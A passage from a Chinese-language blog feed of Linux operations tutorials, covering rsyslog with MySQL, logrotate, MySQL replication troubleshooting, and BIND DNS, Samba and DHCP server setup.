class="meta">#</span><span class="bash"> grep <span class="string">&#x27;Accepted&#x27;</span> /var/<span class="built_in">log</span>/secure*</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="三-mysql存放rsyslog日志"><a href="#三-mysql存放rsyslog日志" class="headerlink" title="三: mysql存放rsyslog日志"></a>三: mysql存放rsyslog日志</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y mariadb mariadb-server</span><br><span class="line">yum install -y rsyslog-mysql  # 安装驱动</span><br><span class="line">rpm -ql rsyslog-mysql # 找到sql文件</span><br><span class="line"></span><br><span class="line"># 将sql文件导入到数据库中</span><br><span class="line">mysql&gt; GRANT ALL ON Syslog.* TO &#39;rsyslog&#39;@&#39;127.0.0.1&#39; IDENTIFIED BY &#39;rsyspass&#39;;</span><br><span class="line">mysql&gt; GRANT ALL ON Syslog.* TO &#39;rsyslog&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;rsyspass&#39;;</span><br><span class="line">mysql&gt; FLUSH PRICVILEGES</span><br><span class="line"></span><br><span class="line"># 配置rsyslog加载ommysql模块</span><br><span class="line">#### MODULES ####</span><br><span class="line">$ModLoad ommysql</span><br><span class="line"></span><br><span class="line"># 配置RULES，将所期望的日志信息记录于mysql中</span><br><span class="line"># 格式为 </span><br><span class="line">facility.priority :ommysql:DBHOST,DB,DBUSER,DBUSERPASS</span><br><span class="line">*.*:ommysql:127.0.0.1,Syslog,rsyslog,rsyspass</span><br><span class="line"></span><br><span class="line">systemctl restart mariadb</span><br><span class="line">systemctl restart rsyslog</span><br></pre></td></tr></table></figure><h4 id="四：集中式日志管理"><a href="#四：集中式日志管理" class="headerlink" title="四：集中式日志管理"></a>四：集中式日志管理</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">自定义日志</span><br><span class="line">自己定义日志的名字和位置</span><br><span class="line">查看日志文件是否起来：systemctl status rsyslog</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">vim /etc/rsyslog.conf -----&gt; 日志的主配置文件  include 包含</span></span><br><span class="line">*.info;mail.none;authpriv.none;cron.none      /var/log/messages 日志定义</span><br><span class="line">      .之前叫做日志对象，要给谁记录日志</span><br><span class="line">      .之后日志级别:级别越低，信息越多 </span><br><span class="line">  日志文件:存储日志的文件</span><br><span class="line">日志级别</span><br><span class="line">        lpr： 打印相关的日志</span><br><span class="line">        auth：认证相关的日志</span><br><span class="line">        user：用户相关的日志</span><br><span class="line">        cron：计划任务相关的日志</span><br><span class="line">        kern：内核相关的日志</span><br><span class="line">        mail：邮件相关的日志</span><br><span class="line">        mark：标记相关的日志</span><br><span class="line">        news：新闻相关的日志</span><br><span class="line">        uucp：文件copy相关的日志</span><br><span class="line">        daemon：系统服务相关的日志</span><br><span class="line">        authpri: 授权相关的日志</span><br><span class="line">        security:安全相关的日志前的级别低，越详细，低的包含高的日志级别</span><br><span class="line">debug：最低的，一般不用</span><br><span class="line">info：安装信息，警告信息，错误信息   </span><br><span class="line">notice：相当与提示</span><br><span class="line">warn/warning：警告，错误                             </span><br><span class="line">error/err：错误，严重错误 </span><br><span class="line">alert：告警，表示已经出现问题</span><br><span class="line">emerg：恐慌级别</span><br><span class="line"></span><br><span class="line">eg：将内核日志文件自定义到/var/log/kern.log</span><br><span class="line">touch /var/log/kern.log</span><br><span class="line">vim /etc/rsyslog.conf ----&gt;kern.info /var/log/kern.log    </span><br><span class="line">查看都有哪些日志对象和日志级别</span><br><span class="line"><span class="meta">#</span><span class="bash">man 5 rsyslog.conf</span></span><br><span class="line">local0 through local7：自己定义的日志文件</span><br><span class="line">======================================</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">*.* /var/log/mylog</span><br><span class="line">kern.err /var/log/kernel.log</span><br><span class="line">*.info;mail.none    /var/log/big.log</span><br><span class="line">mail.info/var/log/mail.log</span><br><span class="line">    cron.info;cron.!err /var/log/newcron</span><br><span class="line"></span><br><span class="line">======================================</span><br><span class="line"></span><br><span class="line">local0-local7日志设备的使用:   ssh的配置文件：/etc/ssh/sshd_config</span><br><span class="line">例：定义sshd日志：</span><br><span class="line">    1.修改sshd服务主配置文件：</span><br><span class="line">    将/etc/ssh/sshd_config 的#SyslogFacility AUTHPRIV改为 SyslogFacility local2</span><br><span class="line">    SyslogFacility local5   //设置ssh的日志定义由local5设备来记录</span><br><span class="line">    2.在rsyslog的主配置文件里加上</span><br><span class="line">     local5.info /var/log/ssh</span><br><span class="line">    3.重启服务</span><br></pre></td></tr></table></figure><h4 id="五：日志切割"><a href="#五：日志切割" class="headerlink" title="五：日志切割"></a>五：日志切割</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">logrotate日志轮转(切割)</span><br><span class="line">========================================================</span><br><span class="line">注：针对任何日志文件</span><br><span class="line"></span><br><span class="line">logrotate (轮转，日志切割)</span><br><span class="line">1. 如果没有日志轮转，日志文件会越来越大，最后导致日志打不开或者是打开时间过长</span><br><span class="line">2. 将丢弃系统中最旧的日志文件，以节省空间</span><br><span class="line">3. logrotate本身不是系统进程，即日志的轮转不会自动执行，它是通过写到相应的配置文件中使用计划任务crond每天执行 </span><br><span class="line">4.对日志的切割，你只需要给他定义一个规则</span><br><span class="line"></span><br><span class="line">[root@newrain ~]# rpm -qa |grep logrotate</span><br><span class="line">logrotate-3.7.8-16.el6.x86_64</span><br><span class="line"></span><br><span class="line">logrotate 配置文件：</span><br><span class="line">/etc/logrotate.conf (决定每个日志文件如何轮转)</span><br><span class="line">/etc/logrotate.d/*</span><br><span class="line"></span><br><span class="line">主配置文件</span><br><span class="line">[root@newrain ~]# vim /etc/logrotate.conf</span><br><span class="line">=========全局设置==========</span><br><span class="line">weekly                      //轮转的周期，一周轮转</span><br><span class="line">rotate 4           //保留4份</span><br><span class="line">create                 //轮转后创建新文件</span><br><span class="line">dateext                           //使用日期作为后缀</span><br><span class="line"><span class="meta">#</span><span class="bash">compress                //是否压缩</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RPM packages drop <span class="built_in">log</span> rotation information into this directory</span>  </span><br><span class="line"><span class="meta">#</span><span class="bash"> rpm安装的程序，按照下面目录规则进行轮转</span></span><br><span class="line">include /etc/logrotate.d  //包含该目录下的文件</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> no packages own wtmp and btmp -- we<span class="string">&#x27;ll rotate them here</span></span>  </span><br><span class="line"><span class="meta">#</span><span class="bash"> 对于wtmp和btmp这样无主的日志，按照下面配置进行轮转</span></span><br><span class="line">/var/log/wtmp &#123;      //对该日志文件设置轮转的方法</span><br><span class="line">    monthly                //一月轮转一次</span><br><span class="line">    minsize 1M            //最小达到1M才轮转，即到了规定的时间未达到大小不会轮转</span><br><span class="line">    create 0664 root utmp//轮转后创建新文件，并设置权限属主和属组</span><br><span class="line">    rotate 1                  //保留一份</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/var/log/btmp &#123;</span><br><span class="line">    missingok            //丢失不提示</span><br><span class="line">    monthly                //每月轮转一次</span><br><span class="line">    create 0600 root utmp//轮转后创建新文件，并设置权限</span><br><span class="line">    rotate 1                  //保留一份</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[root@newrain ~]# vim /etc/logrotate.d/yum  //原有的设置，没有说保存几份，看上面的全局设置</span><br><span class="line">/var/log/yum.log &#123;        //yum日志文件</span><br><span class="line">    missingok            //丢失不提示</span><br><span class="line">    notifempty            //如果为空，不轮转</span><br><span class="line">    size 30k                //达到30k就轮转</span><br><span class="line">    yearly            //达到一年就轮转一次，两者满足一个就轮转</span><br><span class="line">    create 0600 root root  //创建新文件</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[root@newrain ~]# ls /etc/logrotate.d/</span><br><span class="line">chrony  ppp    wpa_supplicant   syslog  yum</span><br><span class="line"></span><br><span class="line">日志的轮转规则文件是在安装rpm包时就自动提供的，无需人为手动编写</span><br><span class="line">只有自己创建的日志文件才需要自己编写日志轮转规则文件</span><br><span class="line">[root@newrain ~]# yum -y install httpd</span><br><span class="line">[root@newrain ~]# ls /etc/logrotate.d/</span><br><span class="line">chrony  ppp    wpa_supplicant   syslog  yum httpd</span><br><span class="line"></span><br><span class="line">[root@newrain logrotate.d]# yum -y install vsftpd</span><br><span class="line">[root@newrain logrotate.d]# ls</span><br><span class="line">chrony  httpd  ppp  syslog  vsftpd  wpa_supplicant  yum</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">当切割之后创建新文件，新文件有新的inode number </span><br><span class="line">如果希望进程如rsyslog、nginx进程会把新的日志写入新日志文件中，应该在日志切割后，告诉一下rsyslog、nginx进程reload 或 信号(1 or HUP)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 系统服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于mysql主从同步问题解决</title>
      <link href="2020/12/04/%E5%85%B3%E4%BA%8Emysql%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
      <url>2020/12/04/%E5%85%B3%E4%BA%8Emysql%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><ul><li>mysql gtid复制方式导出数据报错<blockquote><p>Warning: A partial dump from a server that has GTIDs will by default include the GTIDs of all transactions, even those that changed suppressed parts of the database. If you don’t want to restore GTIDs, pass –set-gtid-purged=OFF. To make a complete dump, pass –all-databases –triggers –routines –events</p></blockquote></li></ul><blockquote><p>解释：当前数据库实例中开启了 GTID 功能, 在开启有 GTID 功能的数据库实例中, 导出其中任何一个库, 如果没有显示地指定–set-gtid-purged参数, 都会提示这一行信息. 意思是默认情况下, 导出的库中含有 GTID 信息, 如果不想导出包含有 GTID 信息的数据库, 需要显示地添加–set-gtid-purged=OFF参数.</p></blockquote><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 数据导出时</span><br><span class="line">mysqldump -uroot  -p  --set-gtid-purged&#x3D;OFF   --all-databases &gt; test.sql</span><br><span class="line">正常导入即可</span><br></pre></td></tr></table></figure><h3 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h3><blockquote><p>Fatal error: The slave I/O thread stops because master and slave have equal MySQL server UUIDs; these UUIDs must be different for replication to work</p></blockquote><blockquote><p>致命错误：由于master和slave具有相同的mysql服务器uuid，导致I/O线程不进行；这些uuid必须不同才能使复制工作。</p></blockquote><h3 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改uuid并重启服务</span><br><span class="line">[root@localhost ~]# vim &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;auto.cnf</span><br><span class="line">[auto]</span><br><span class="line">server-uuid&#x3D;4f37a731-9b79-11e8-8013-000c29f0700f</span><br></pre></td></tr></table></figure><h3 id="问题三"><a href="#问题三" class="headerlink" title="问题三"></a>问题三</h3><ul><li>主从同步主键冲突问题<blockquote><p>Last_SQL_Error: Error ‘Duplicate entry ‘1001-164761-0’ for key ‘PRIMARY’’ on query. Default database: ‘bug’. Query: ‘insert into misdata (uid,mid,pid,state,mtime) values (164761,1001,0,-1,1262623560)’</p></blockquote></li></ul><h3 id="解决-2"><a href="#解决-2" class="headerlink" title="解决"></a>解决</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#第一种方式，跳过错误</span><br><span class="line">1.跳过指定数量的事务</span><br><span class="line">mysql&gt;stop slave;</span><br><span class="line">mysql&gt;SET GLOBAL SQL_SLAVE_SKIP_COUNTER &#x3D; 1 #跳过一个事务</span><br><span class="line">mysql&gt;start slave</span><br><span class="line">　　 </span><br><span class="line">2.修改mysql的配置文件，通过slave_skip_errors参数来跳过指定类型的错误或跳过所有错误</span><br><span class="line">[root@mysql-slave ~]# vim &#x2F;etc&#x2F;my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">slave-skip-errors&#x3D;1062,1053,1146 #跳过1062,1053,1146类型的错误</span><br><span class="line"># slave-skip-errors&#x3D;all #跳过所有错误</span><br><span class="line"></span><br><span class="line">#第二种方式，针对互为主从情况</span><br><span class="line">[root@mysql-slave ~]# vim &#x2F;etc&#x2F;my.cnf</span><br><span class="line"># auto_increment_increment&#x3D;2  # 自增减步长</span><br><span class="line"># auto_increment_offset&#x3D;2     # 自增减开始</span><br></pre></td></tr></table></figure><h3 id="主从同步指定库"><a href="#主从同步指定库" class="headerlink" title="主从同步指定库"></a>主从同步指定库</h3><p>解释： 从一个库的层面上来设置同步某个库或表，下面的方式，选其一。</p><ul><li><p>主库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binlog-do-db      二进制日志记录的数据库（多数据库用逗号，隔开）</span><br><span class="line">例： binlog-do-db&#x3D;test1,test2</span><br><span class="line">表示test1、test2 同步，其他忽略，如果不填写表示同步全部</span><br><span class="line">binlog-ignore-db 二进制日志中忽略数据库 （多数据库用逗号，隔开）</span><br></pre></td></tr></table></figure></li><li><p>从库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">replicate-do-db    设定需要复制的数据库（多数据库使用逗号，隔开）</span><br><span class="line">replicate-ignore-db 设定需要忽略的复制数据库 （多数据库使用逗号，隔开）</span><br><span class="line">replicate-do-table  设定需要复制的表</span><br><span class="line">replicate-ignore-table 设定需要忽略的复制表 </span><br><span class="line">replicate-wild-do-table 同replication-do-table功能一样，支持通配符</span><br><span class="line">replicate-wild-ignore-table 同replication-ignore-table功能一样，支持通配符</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 数据库 </category>
          
          <category> 填坑小将 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS 服务器</title>
      <link href="2020/12/04/%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1_DNS/"/>
      <url>2020/12/04/%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1_DNS/</url>
      
        <content type="html"><![CDATA[<h1 id="DNS-服务器"><a href="#DNS-服务器" class="headerlink" title="DNS 服务器"></a>DNS 服务器</h1><h2 id="DNS原理"><a href="#DNS原理" class="headerlink" title="DNS原理"></a>DNS原理</h2><h3 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h3><ul><li><p>1.递归查询             直接把结果给客户端     </p></li><li><p>2.迭代查询             如果知道结果，把结果告诉客户端，如果不知道结果，会把查询转发到下一台DNS服务器</p></li></ul><h3 id="DNS解析类型"><a href="#DNS解析类型" class="headerlink" title="DNS解析类型"></a>DNS解析类型</h3><p>DNS服务器知识点:     SOA 记录:起始授权记录     NS 记录:指定管理某一个域的服务器是谁子域授权     A 记录:正向解析       把域名解析成IP         PTR 记录:反向解析     MX 记录:指定邮件服务器     CNAME:别名     泛域名解析     负载均衡     主从     只缓存     转发     子域授权     View 视图</p><h1 id="DNS-部署"><a href="#DNS-部署" class="headerlink" title="DNS 部署"></a>DNS 部署</h1><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>服务器3台、系统centos  </p><h4 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y bind bind-utils bind-chroot</span><br><span class="line">   bind  主包</span><br><span class="line">   bind-utils   客户端测试工具（host 、dig 、nslookup）</span><br><span class="line">   bind-chroot   chroot环境  禁锢dns服务器的工作目录</span><br><span class="line">   caching-nameserver(rhel5提供模板文本，缓存服务)   rhel6不需要</span><br></pre></td></tr></table></figure><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld &amp;&amp; setenforce 0</span><br></pre></td></tr></table></figure><h4 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># systemctl start named</span><br><span class="line">    如果启动服务没有工作目录的文件夹</span><br></pre></td></tr></table></figure><h4 id="工作目录"><a href="#工作目录" class="headerlink" title="工作目录"></a>工作目录</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;named&#x2F;chroot&#x2F;etc                    存放主配置文件</span><br><span class="line">&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;named         </span><br></pre></td></tr></table></figure><h6 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">备份配置文件</span><br><span class="line">cp &#x2F;etc&#x2F;named.conf &#x2F;etc&#x2F;named.conf.backup</span><br><span class="line"></span><br><span class="line">修改配置文件:</span><br><span class="line">[root@wing etc]# vim &#x2F;etc&#x2F;named.conf </span><br><span class="line">options &#123;</span><br><span class="line">    # 监听在主机的53端口上。any代表监听所有的主机</span><br><span class="line">    listen-on port 53 &#123; any; &#125;;</span><br><span class="line">    listen-on-v6 port 53 &#123; ::1; &#125;;</span><br><span class="line"></span><br><span class="line">    # 如果此档案底下有规范到正反解的zone file 档名时，该档名预设应该放置在哪个目录底下</span><br><span class="line">    directory     &quot;&#x2F;var&#x2F;named&quot;;</span><br><span class="line"></span><br><span class="line">    # 下面三项是服务的相关统计信息</span><br><span class="line">    dump-file     &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;cache_dump.db&quot;;</span><br><span class="line">    statistics-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;named_stats.txt&quot;;</span><br><span class="line">    memstatistics-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;named_mem_stats.txt&quot;;</span><br><span class="line"></span><br><span class="line">    # 谁可以对我的DNS服务器提出查询请求。any代表任何人</span><br><span class="line">    allow-query     &#123; any; &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;* </span><br><span class="line">     - If you are building an AUTHORITATIVE DNS server, do NOT enable recursion.</span><br><span class="line">     - If you are building a RECURSIVE (caching) DNS server, you need to enable </span><br><span class="line">       recursion. </span><br><span class="line">     - If your recursive DNS server has a public IP address, you MUST enable access </span><br><span class="line">       control to limit queries to your legitimate users. Failing to do so will</span><br><span class="line">       cause your server to become part of large scale DNS amplification </span><br><span class="line">       attacks. Implementing BCP38 within your network would greatly</span><br><span class="line">       reduce such attack surface </span><br><span class="line">    *&#x2F;</span><br><span class="line">    recursion yes;</span><br><span class="line"></span><br><span class="line">    dnssec-enable yes;</span><br><span class="line">    dnssec-validation yes;</span><br><span class="line"></span><br><span class="line">        dnssec-lookaside auto;</span><br><span class="line">        forwarders &#123; </span><br><span class="line">           # 指定上层DNS服务器（网关）</span><br><span class="line">           192.168.1.1;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Path to ISC DLV key *&#x2F;</span><br><span class="line">    bindkeys-file &quot;&#x2F;etc&#x2F;named.iscdlv.key&quot;;</span><br><span class="line"></span><br><span class="line">    managed-keys-directory &quot;&#x2F;var&#x2F;named&#x2F;dynamic&quot;;</span><br><span class="line"></span><br><span class="line">    pid-file &quot;&#x2F;run&#x2F;named&#x2F;named.pid&quot;;</span><br><span class="line">    session-keyfile &quot;&#x2F;run&#x2F;named&#x2F;session.key&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">logging &#123;</span><br><span class="line">        channel default_debug &#123;</span><br><span class="line">                file &quot;data&#x2F;named.run&quot;;</span><br><span class="line">                severity dynamic;</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;.&quot; IN &#123;</span><br><span class="line">    type hint;</span><br><span class="line">    file &quot;named.ca&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">include &quot;&#x2F;etc&#x2F;named.rfc1912.zones&quot;;</span><br><span class="line">include &quot;&#x2F;etc&#x2F;named.root.key&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">增加zone信息</span><br><span class="line">vim &#x2F;etc&#x2F;named.rfc1912.zones</span><br><span class="line">zone &quot;baidu.com&quot; IN &#123;    </span><br><span class="line">       # 定义要解析主域名</span><br><span class="line">        type master;</span><br><span class="line">        file &quot;baidu.com.zone&quot;;  </span><br><span class="line">       # 具体相关解析的配置文件保存在 &#x2F;var&#x2F;named&#x2F;baidu.com.zone 文件中</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">编辑区域配置文件</span><br><span class="line">vim &#x2F;var&#x2F;named&#x2F;baidu.com.zone</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$TTL 1D</span><br><span class="line">@       IN SOA          baidu.com. root (</span><br><span class="line">                                        1       ; serial</span><br><span class="line">                                        1D      ; refresh</span><br><span class="line">                                        1H      ; retry</span><br><span class="line">                                        1W      ; expire</span><br><span class="line">                                        0 )     ; minimum</span><br><span class="line"></span><br><span class="line">        IN      NS      baidu.com.</span><br><span class="line">        IN      A       192.168.101.1</span><br><span class="line">www     IN      A       192.168.101.244</span><br><span class="line">test    IN      A       192.168.101.129</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>增加权限 并启动服务</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown root:named test.com.zone</span><br><span class="line">systemctl start named</span><br><span class="line">systemctl enable named</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>samba 服务</title>
      <link href="2020/12/04/%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1__samba/"/>
      <url>2020/12/04/%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1__samba/</url>
      
        <content type="html"><![CDATA[<h1 id="samba"><a href="#samba" class="headerlink" title="samba"></a>samba</h1><pre><code>windows和linux之间互相共享文件微软发明：协议samba端口    # lsof -i:139</code></pre><h2 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h2><pre><code>安装软件    samba-client.x86_64    samba-common.x86_64    samba.x86_64    # yum install samba-client samba samba-commonyum install cifs-utils -y 启动服务：    # systemctl start smb    </code></pre><h2 id="编写配置文件"><a href="#编写配置文件" class="headerlink" title="编写配置文件"></a>编写配置文件</h2><pre><code>    # vim /etc/samba/smb.conf    #开头的是注释（说明）    ; 开头的也是注释（选项）    全局配置：        局部配置(共享设置)   //我们在7里面不用修改任何全局配置        workgroup = MYGROUP     //工作组        server string = Samba Server Version %v   //共享服务器描述        log file = /var/log/samba/log.%m    //日志存储位置        max log size = 50   //日志大小        security = user       //共享的时候所使用安全级别        passdb backend = tdbsam  用户和密码的存储文件     局部配置：        [test]                 //共享名称        comment = this share my /tmp directory    //描述        path = /tmp        //共享目录        public = yes       //允许来宾用户访问        writable = yes        guest ok = yes    //和public一样        valid users = tom jim kate  @caiwu     匿名共享(rhel/5/6)        security=share     添加账户：            #useradd wing               //添加系统账户    #smbpasswd  -a  wing    //添加smb账户重启服务：    rhel5/6        #/etc/init.d/smb restart           #/etc/init.d/nmb restart    rhel7:        #systemctl  start smb    </code></pre><h2 id="登录方式"><a href="#登录方式" class="headerlink" title="登录方式"></a>登录方式</h2><pre><code>windows    1.网上邻居    2.资源管理器--&gt;  \\172.16.70.251    3.运行 --&gt; \\172.16.70.251linux    1.挂载方式        #mount  -t cifs  //172.16.70.251/test    /opt   -o username=tom    2.使用客户端命令登录方式        # smbclient  //172.16.70.251/test          -U, --user=USERNAME </code></pre><h5 id="注意-mount方式后面的test是模块名称-共享目录需给予777权限"><a href="#注意-mount方式后面的test是模块名称-共享目录需给予777权限" class="headerlink" title="注意 mount方式后面的test是模块名称 共享目录需给予777权限"></a>注意 mount方式后面的test是模块名称 共享目录需给予777权限</h5><p>权限控制<br>    限制Ip<br>        写到全局配置内对所有共享生效<br>        写到局部配置内对指定共享生效</p><pre><code>    只允许allow后面的网段或者ip访问：        hosts allow = 172.16.70.     172.16.71.                                  172.16.70.250   172.16.70.251    只拒绝deny后面的网段或者ip访问：                    hosts deny = 172.16.70.限制账户（局部配置）     read  list  =  用户   @组             write list  =   用户   @组      valid  users  =  用户   @组      read only  =  yes     browseable = yes    //共享是否可见</code></pre><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看smb服务器共享信息：</span><br><span class="line">    # smbclient -L 10.18.44.196 -U user1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 存储 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dhcp 服务</title>
      <link href="2020/12/04/%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1_dhcp/"/>
      <url>2020/12/04/%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1_dhcp/</url>
      
        <content type="html"><![CDATA[<h1 id="dhcp-简介"><a href="#dhcp-简介" class="headerlink" title="dhcp 简介"></a>dhcp 简介</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> DHCP是Dynamic Host Configuration Protocol（动态主机配置协议）的缩写，主要是为网络客户机自动动态分配IP地址。</span><br><span class="line">使用DHCP时，在网络上至少要有一台DHCP服务器，当网络中的DHCP客户端程序发出请求获取IP地址的信息后，DHCP服务器会根据目前已经配置的地址池，提供一个可供使用的IP地址和子网掩码给DHCP客户端。</span><br><span class="line"></span><br><span class="line">DHCP服务器的作用</span><br><span class="line">    使用DHCP可以大大简化配置客户机的TCP&#x2F;IP的工作，尤其是当某些TCP&#x2F;IP参数改变时，如网络的大规模重建而引起的IP地址和子网掩码的更改。</span><br><span class="line">   DHCP服务器上的IP地址数据库包含如下内容：</span><br><span class="line"> （1）所有客户机的有效配置参数</span><br><span class="line"> （2）在缓冲池中指定给客户机的有效IP地址，以及手工指定的保留地址</span><br><span class="line"> （3）服务提供租约时间</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.安装包<br><code>[root@localhost ~]# yum install dhcp*</code></p><p>2.配置网络，确保ip地址为静态ip地址</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TYPE&#x3D;Ethernet</span><br><span class="line">PROXY_METHOD&#x3D;none</span><br><span class="line">BROWSER_ONLY&#x3D;no</span><br><span class="line">BOOTPROTO&#x3D;static</span><br><span class="line">DEFROUTE&#x3D;yes</span><br><span class="line">IPV4_FAILURE_FATAL&#x3D;no</span><br><span class="line">NAME&#x3D;ens33</span><br><span class="line">IPADDR&#x3D;192.168.101.224</span><br><span class="line">NETMASK&#x3D;255.255.255.0</span><br><span class="line">GATEWAY&#x3D;192.168.101.1</span><br><span class="line">ONBOOT&#x3D;yes</span><br><span class="line">DNS2&#x3D;8.8.8.8</span><br><span class="line">DNS1&#x3D;114.114.114.114</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.修改配置文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -rf &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line">cp &#x2F;usr&#x2F;share&#x2F;doc&#x2F;dhcp*&#x2F;dhcpd.conf.example &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line"></span><br><span class="line">subnet 192.168.101.0 netmask 255.255.255.0 &#123;    # 声明网段和子网掩码</span><br><span class="line">  range 192.168.101.10 192.168.101.13;          # 声明自动获取ip地址的范围</span><br><span class="line">  option domain-name-servers ns1.internal.example.org;  # 指定dns服务器</span><br><span class="line">  option domain-name &quot;internal.example.org&quot;;            # 指定默认搜索域</span><br><span class="line">  option routers 192.168.101.1;                         # 指定默认网关</span><br><span class="line">  option broadcast-address 192.168.101.255;             # 指定广播地址</span><br><span class="line">  default-lease-time 600;                               # 指定默认租约为10分钟</span><br><span class="line">  max-lease-time 7200;                                  # 最大租约为2小时</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4.开启dhcp服务</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start dhcpd </span><br><span class="line">systemctl enable dhcpd</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.关闭服务器和客户端，修改网络模式<br>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-zlZ2ksKr-1577028205856)(<a href="https://note.youdao.com/yws/res/6042/DEE1CAE34FFF446DA66ACEFE2F1AF97F)]">https://note.youdao.com/yws/res/6042/DEE1CAE34FFF446DA66ACEFE2F1AF97F)]</a></p><p>6.启动后客户机执行dhclient命令获取IP地址<br><code>dhclient</code></p>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsftpd</title>
      <link href="2020/12/04/%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1_vsftpd/"/>
